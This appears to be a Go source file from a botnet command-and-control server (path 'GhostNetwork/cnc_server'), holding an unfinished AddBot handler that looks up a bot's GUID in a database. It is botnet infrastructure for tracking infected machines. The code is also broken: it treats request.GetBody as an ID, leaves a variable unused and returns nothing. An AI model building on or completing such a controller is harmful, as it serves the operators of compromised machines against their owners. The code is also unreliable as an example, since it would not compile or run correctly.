package handler

import (
	"net/http"

	"github.com/bienkma/GhostNetwork/cnc_server/database"
)

// AddBot function
func (bigBot *BotServer) AddBot(response http.ResponseWriter, request *http.Request) {
	request.ParseForm()

	guid := request.GetBody

	var botModel database.Bots
	check := bigBot.db.First(botModel, "UUID=?", &guid)
}
